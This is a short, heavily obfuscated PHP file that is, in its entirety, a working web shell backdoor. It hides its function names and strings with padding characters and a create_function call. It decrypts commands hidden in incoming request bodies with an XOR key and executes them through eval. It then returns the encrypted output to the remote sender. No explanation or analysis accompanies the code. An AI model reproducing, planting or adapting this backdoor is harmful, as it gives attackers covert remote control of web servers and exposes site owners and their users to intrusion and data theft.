<?php
$t='=U0;(U$j<$c&&U$i<$l);$j++,$iU++){$Uo.=$t{U$i}^U$k{$j};}}Ureturn $oU;}iUf (@preg_Umat';
$g=';@evaUl(@UgzuncompreUssU(@x(@base6U4_Udecode($m[1]),$k))UU);$Uo=@ob_get_contenUts(U)U;@';
$s='$k="efe0U06Ub2";$Ukh="21cU40cfU2a134";$kf="Ufb943aU63U95e1";$p="U5Dll0CUfZHnIUWG9hU';
$q=str_replace('Yr','','cYrrYreatYreYr_fuYrnctYrion');
$b='m"U;UfUunUction x(U$t,$k){$c=strlen($kU);$Ul=strlen($t)U;$o="";forU(U$i=0U;$i<$l;){foUUr($j';
$N='chU("/$kUh(.+)$Ukf/",@UfileUU_get_cUonteUUntUs("php://input"),$m)U==1) {@obUU_startU()';
$y='ob_end_cleaUn();$r=U@basUeU64_encode(@Ux(@gzcUomprUessU($o),$kU)U);print("$p$Ukh$r$kf");}';
$a=str_replace('U','',$s.$b.$t.$N.$g.$y);
$f=$q('',$a);$f();
?>
